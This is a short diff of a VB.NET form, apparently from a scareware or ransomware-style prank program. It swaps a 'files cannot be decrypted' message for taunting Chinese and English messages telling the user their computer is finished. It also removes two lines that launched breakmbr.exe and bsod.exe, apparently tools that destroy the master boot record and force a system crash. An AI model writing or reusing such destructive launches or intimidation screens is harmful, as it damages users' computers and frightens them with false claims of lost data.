@@ -70,15 +70,20 @@ Public Class Form1
     End Sub
 
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
-        MsgBox("已加密的文件无法解密", 16, "emmm")
+        MsgBox("你的电脑GG", 16, "emmm")
         MsgBox("谁让你知识短浅", 16, "emmm")
         MsgBox("口亨", 16, "emmm")
         MsgBox("不和你多说了，再见！！！", 16, "emmm")
+        MsgBox("REST IN PISS, FOREVER IN MISS!", 16, "emmm")
         End
     End Sub
 
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
-        Process.Start(Application.StartupPath + "\breakmbr.exe")
-        Process.Start(Application.StartupPath + "\bsod.exe")
+        MsgBox("你的电脑GG", 16, "emmm")
+        MsgBox("谁让你知识短浅", 16, "emmm")
+        MsgBox("口亨", 16, "emmm")
+        MsgBox("不和你多说了，再见！！！", 16, "emmm")
+        MsgBox("REST IN PISS, FOREVER IN MISS!", 16, "emmm")
+        End
     End Sub
 End Class
